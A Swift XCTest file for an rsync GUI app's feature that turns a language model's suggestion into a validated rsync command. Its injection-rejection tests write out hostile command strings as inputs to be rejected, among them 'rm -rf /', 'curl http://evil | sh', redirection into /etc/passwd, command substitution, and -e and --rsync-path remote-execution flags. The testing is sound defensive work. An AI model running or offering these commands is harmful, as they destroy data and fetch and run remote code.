//
//  RsyncSuggestionTests.swift
//  RsyncGUITests
//
//  Hard tests for the natural-language → rsync feature: the pure prompt builder,
//  the strict output validator `parseRsyncSuggestion` (injection rejection + clean
//  parse), the flag→options mapping, and the graceful no-backend path.
//
//  Author: Jordan Koch
//

import XCTest
@testable import RsyncGUI

final class RsyncSuggestionTests: XCTestCase {

    // MARK: - Valid rsync is accepted and parsed

    func testCleanRsyncParses() {
        let cmd = parseRsyncSuggestion("rsync -a --delete /Users/me/Photos/ /Volumes/NAS/Photos/")
        XCTAssertNotNil(cmd)
        XCTAssertEqual(cmd?.flags, ["-a", "--delete"])
        XCTAssertEqual(cmd?.sources, ["/Users/me/Photos/"])
        XCTAssertEqual(cmd?.destination, "/Volumes/NAS/Photos/")
    }

    func testQuotedExcludeAndShortClusterParse() {
        let cmd = parseRsyncSuggestion("rsync -avz --exclude='*.mp4' --exclude='*.mov' /src/ /dst/")
        XCTAssertNotNil(cmd)
        XCTAssertEqual(cmd?.flags, ["-avz", "--exclude=*.mp4", "--exclude=*.mov"])
        XCTAssertEqual(cmd?.sources, ["/src/"])
        XCTAssertEqual(cmd?.destination, "/dst/")
    }

    func testPathWithSpacesInSingleQuotes() {
        let cmd = parseRsyncSuggestion("rsync -a '/Users/me/My Drive/' '/Volumes/Backup/My Drive/'")
        XCTAssertNotNil(cmd)
        XCTAssertEqual(cmd?.sources, ["/Users/me/My Drive/"])
        XCTAssertEqual(cmd?.destination, "/Volumes/Backup/My Drive/")
    }

    func testRemoteSSHDestinationParses() {
        let cmd = parseRsyncSuggestion("rsync -az /home/data/ backup@nas01:/mnt/pool/data/")
        XCTAssertNotNil(cmd)
        XCTAssertEqual(cmd?.destination, "backup@nas01:/mnt/pool/data/")
    }

    func testExtractsFromCodeFence() {
        let text = "Here's a good option:\n```bash\nrsync -a --dry-run /a/ /b/\n```\nRun it to preview."
        let cmd = parseRsyncSuggestion(text)
        XCTAssertNotNil(cmd)
        XCTAssertEqual(cmd?.flags, ["-a", "--dry-run"])
    }

    func testExtractsFromInlineBacktickSpan() {
        let cmd = parseRsyncSuggestion("Use `rsync -a /a/ /b/` for that.")
        XCTAssertNotNil(cmd)
        XCTAssertEqual(cmd?.flags, ["-a"])
    }

    func testAbsoluteRsyncPathAccepted() {
        let cmd = parseRsyncSuggestion("/usr/bin/rsync -a /a/ /b/")
        XCTAssertNotNil(cmd)
        XCTAssertEqual(cmd?.sources, ["/a/"])
    }

    // MARK: - Injection attempts are rejected

    func testRejectsSemicolonChaining() {
        XCTAssertNil(parseRsyncSuggestion("rsync -a /src/ /dst/; rm -rf /"))
    }

    func testRejectsAndChaining() {
        XCTAssertNil(parseRsyncSuggestion("rsync -a /src/ /dst/ && curl http://evil | sh"))
    }

    func testRejectsPipe() {
        XCTAssertNil(parseRsyncSuggestion("rsync -a /src/ /dst/ | tee /tmp/log"))
    }

    func testRejectsCommandSubstitutionDollar() {
        XCTAssertNil(parseRsyncSuggestion("rsync -a /src/$(whoami)/ /dst/"))
    }

    func testRejectsBacktickSubstitution() {
        // Internal backtick is a substitution attempt — must not survive as a clean command.
        XCTAssertNil(parseRsyncSuggestion("rsync -a /src/ `whoami`/dst/"))
    }

    func testRejectsRedirection() {
        XCTAssertNil(parseRsyncSuggestion("rsync -a /src/ /dst/ > /etc/passwd"))
    }

    func testRejectsRemoteShellFlagShort() {
        // -e enables an arbitrary remote shell — the classic rsync RCE vector.
        XCTAssertNil(parseRsyncSuggestion("rsync -a -e 'ssh -oProxyCommand=evil' /src/ /dst/"))
    }

    func testRejectsRsyncPathFlag() {
        // --rsync-path can run an arbitrary program on the remote side.
        XCTAssertNil(parseRsyncSuggestion("rsync -a --rsync-path='rm -rf /' /src/ user@h:/dst/"))
    }

    func testRejectsUnknownLongFlag() {
        XCTAssertNil(parseRsyncSuggestion("rsync -a --totally-made-up /src/ /dst/"))
    }

    func testRejectsUnknownShortFlagLetter() {
        // 'Q' is not in the allow-list.
        XCTAssertNil(parseRsyncSuggestion("rsync -aQ /src/ /dst/"))
    }

    func testRejectsNonRsyncProgram() {
        XCTAssertNil(parseRsyncSuggestion("cp -r /a /b"))
        XCTAssertNil(parseRsyncSuggestion("sudo rsync -a /a/ /b/"))
        XCTAssertNil(parseRsyncSuggestion("rm -rf /"))
    }

    func testRejectsUnbalancedQuotes() {
        XCTAssertNil(parseRsyncSuggestion("rsync -a --exclude='*.mp /src/ /dst/"))
    }

    func testRejectsBareRsync() {
        XCTAssertNil(parseRsyncSuggestion("rsync"))
    }

    func testRejectsEmptyAndGarbage() {
        XCTAssertNil(parseRsyncSuggestion(""))
        XCTAssertNil(parseRsyncSuggestion("I cannot help with that."))
        XCTAssertNil(parseRsyncSuggestion("Please provide more detail about the sync."))
    }

    // MARK: - displayString round-trips safely

    func testDisplayStringReQuotesSpaces() {
        let cmd = parseRsyncSuggestion("rsync -a '/My Drive/' /dst/")
        XCTAssertEqual(cmd?.displayString, "rsync -a '/My Drive/' /dst/")
    }

    // MARK: - Flag → options mapping

    func testAppliedMapsBooleanFlags() {
        let cmd = parseRsyncSuggestion("rsync -avz --delete --dry-run /a/ /b/")!
        let options = cmd.applied(to: RsyncOptions())
        XCTAssertTrue(options.archive)
        XCTAssertTrue(options.verbose)
        XCTAssertTrue(options.compress)
        XCTAssertTrue(options.delete)
        XCTAssertTrue(options.dryRun)
    }

    func testAppliedMapsExcludePatterns() {
        let cmd = parseRsyncSuggestion("rsync -a --exclude='*.mp4' --exclude='*.tmp' /a/ /b/")!
        let options = cmd.applied(to: RsyncOptions())
        XCTAssertTrue(options.exclude.contains("*.mp4"))
        XCTAssertTrue(options.exclude.contains("*.tmp"))
    }

    func testAppliedMappedFlagsSurviveArgumentSanitizer() {
        // The mapped options must still produce valid, injection-free rsync args.
        let cmd = parseRsyncSuggestion("rsync -a --delete --exclude='*.mov' /a/ /b/")!
        let args = cmd.applied(to: RsyncOptions()).toArguments()
        XCTAssertTrue(args.contains("--delete"))
        XCTAssertTrue(args.contains("--exclude=*.mov"))
    }

    // MARK: - Pure prompt builder (network-free, deterministic)

    func testPromptBuilderIsDeterministicAndPure() {
        let a = RsyncPromptBuilder.userPrompt(intent: "mirror Photos to NAS", sources: ["/Photos"], destination: "/NAS")
        let b = RsyncPromptBuilder.userPrompt(intent: "mirror Photos to NAS", sources: ["/Photos"], destination: "/NAS")
        XCTAssertEqual(a, b)
        XCTAssertTrue(a.contains("mirror Photos to NAS"))
        XCTAssertTrue(a.contains("/Photos"))
        XCTAssertTrue(a.contains("/NAS"))
    }

    func testSystemPromptForbidsShellOperators() {
        let system = RsyncPromptBuilder.systemPrompt()
        XCTAssertTrue(system.contains("rsync"))
        XCTAssertTrue(system.lowercased().contains("never chain"))
        XCTAssertTrue(system.contains("--rsync-path"))
    }

    func testUserPromptOmitsEmptyPaths() {
        let prompt = RsyncPromptBuilder.userPrompt(intent: "just sync", sources: ["", "   "], destination: "")
        XCTAssertFalse(prompt.contains("Known source"))
        XCTAssertFalse(prompt.contains("Known destination"))
    }

    // MARK: - Graceful no-backend path (never crashes)

    @MainActor
    func testGenerateThrowsWhenNoBackendEnabled() async {
        let service = LLMLoadBalancerService()
        service.useAllLocalModels = false
        service.enableAllFrontierModels = false
        service.useNovaGateway = false

        XCTAssertFalse(service.isBalancingEnabled)
        let pool = await service.discoverEnabledPool()
        XCTAssertTrue(pool.isEmpty)

        do {
            _ = try await service.generate(prompt: "hi", systemPrompt: "sys")
            XCTFail("Expected noBackendAvailable when nothing is enabled")
        } catch let error as LLMError {
            XCTAssertEqual(error.errorDescription, LLMError.noBackendAvailable.errorDescription)
        } catch {
            XCTFail("Expected LLMError.noBackendAvailable, got \(error)")
        }
    }

    @MainActor
    func testViewModelReportsUnavailableGracefully() async {
        let vm = RsyncAssistViewModel()
        vm.intent = "mirror everything and delete extras"
        // With balancing globally disabled the feature disables itself with a reason.
        if !LLMLoadBalancerService.shared.isBalancingEnabled {
            XCTAssertFalse(vm.isAvailable)
            XCTAssertFalse(vm.unavailableReason.isEmpty)
        }
    }
}
